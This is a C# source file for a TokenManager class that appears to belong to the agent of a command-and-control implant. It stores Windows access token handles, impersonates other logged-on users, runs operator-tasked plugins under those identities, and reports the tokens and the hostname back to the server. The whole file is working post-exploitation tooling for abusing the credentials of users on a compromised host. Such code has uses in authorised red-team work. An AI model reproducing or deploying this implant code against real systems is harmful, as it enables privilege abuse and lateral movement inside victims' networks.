using Microsoft.Win32.SafeHandles;
using System.Text.Json;
using System.Security.Principal;
using Agent.Models;
using Agent.Interfaces;
using Agent.Utilities;

namespace Agent.Managers
{
    public class TokenManager : ITokenManager
    {
        static Dictionary<int, SafeAccessTokenHandle> tokens = new Dictionary<int, SafeAccessTokenHandle>();
        private ILogger logger { get; set; }
        public TokenManager(ILogger logger)
        {
            this.logger = logger;
        }

        public bool Impersonate(int i)
        {
            if (tokens.ContainsKey(i))
            {
                return Native.ImpersonateLoggedOnUser(tokens[i]);
            }
            return false;
        }

        public void RunTaskImpersonated(IPlugin plug, ServerJob job)
        {
            _ = WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), async () =>
            {
                await plug.Execute(job);
            });
        }

        public void HandleFilePluginImpersonated(IFilePlugin plug, ServerJob job, ServerTaskingResponse response)
        {
            _ = WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), async () =>
            {
                await plug.HandleNextMessage(response);
            });
        }

        public void HandleInteractivePluginImpersonated(IInteractivePlugin plug, ServerJob job, InteractMessage message)
        {
            WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), () =>
            {
                plug.Interact(message);
            });
        }

        public string List(ServerJob job)
        {
            Dictionary<string, string> toks = new Dictionary<string, string>();
            foreach (var token in tokens)
            {
                toks.Add(token.Key.ToString(), token.Value.DangerousGetHandle().ToString());
            }

            return new TaskResponse()
            {
                completed = true,
                user_output = JsonSerializer.Serialize(toks),
                task_id = job.task.id,
            }.ToJson();
        }

        public bool Revert()
        {
            return Native.RevertToSelf();
        }

        public int getIntegrity()
        {
            bool isAdmin;
            using (var identity = WindowsIdentity.GetCurrent())
            {
                var principal = new WindowsPrincipal(identity);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            return isAdmin ? 3 : 2;
        }

        public TokenTaskResponse AddToken(SafeAccessTokenHandle hToken, CreateToken tokenOptions, string task_id)
        {
            Token token = new Token()
            {
                action = "add",
                Handle = hToken.DangerousGetHandle().ToInt64(),
                description = tokenOptions.name,
                token_id = tokens.Count + 1
            };
            if (tokenOptions.username.Contains("@"))
            {
                string[] split = tokenOptions.username.Split('@');
                token.user = $"{split[1]}\\{split[0]}";
            }
            else
            {
                token.user = $"{tokenOptions.domain}\\{tokenOptions.username}";
            }

            tokens.Add(token.token_id, hToken);

            return new TokenTaskResponse()
            {
                process_response = new Dictionary<string, string> { { "message", "0x22" } },
                completed = true,
                task_id = task_id,
                tokens = new List<Token>() { token },
                callback_tokens = new List<CallbackToken> { new CallbackToken()
                {
                    action = "add",
                    host = System.Net.Dns.GetHostName(),
                    token_id = token.token_id,
                } }

            };
        }

        public SafeAccessTokenHandle GetImpersonationContext(int id)
        {
            return tokens[id];
        }
    }
}
